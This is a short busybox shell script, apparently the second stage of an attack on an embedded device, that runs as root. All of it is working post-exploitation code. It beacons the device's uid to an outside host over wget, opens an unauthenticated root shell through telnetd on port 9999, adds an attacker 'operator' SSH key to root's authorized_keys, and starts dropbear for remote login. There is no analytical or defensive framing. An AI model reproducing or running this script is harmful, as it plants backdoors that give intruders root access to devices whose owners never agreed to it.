#!/bin/sh
# FSS stage2 — runs as root from the component payload. Goal: a shell that survives
# until the next boot, and proof of it. Everything here is the stock busybox; nothing
# assumes curl or a writable rootfs.
B=http://192.168.4.160:8080
beacon() { /bin/busybox wget -q -O /dev/null "$B/fss-ran?uid=$(/bin/busybox id -u 2>/dev/null)&via=$1" 2>/dev/null; }
beacon stage2
# 1. persistent-ish telnetd (tmpfs, gone at reboot, enough to work)
/bin/busybox telnetd -l /bin/sh -p 9999 2>/dev/null && beacon telnetd9999
# 2. operator key, for dropbear when it exists
mkdir -p /root/.ssh 2>/dev/null
{
  echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIADavyW22UvqmBPN8U46N4XpwB6fNaf6xtbfnFT/gSfm contabo-vps-fleet fss-operator'
} >> /root/.ssh/authorized_keys 2>/dev/null
chmod 700 /root/.ssh 2>/dev/null
chmod 600 /root/.ssh/authorized_keys 2>/dev/null
# 3. dropbear if the build carries one
for d in /usr/sbin/dropbear /usr/bin/dropbear /sbin/dropbear /bin/dropbear; do
  [ -x "$d" ] || continue
  "$d" -R -p 22 2>/dev/null && { beacon dropbear22; break; }
done
beacon stage2-done
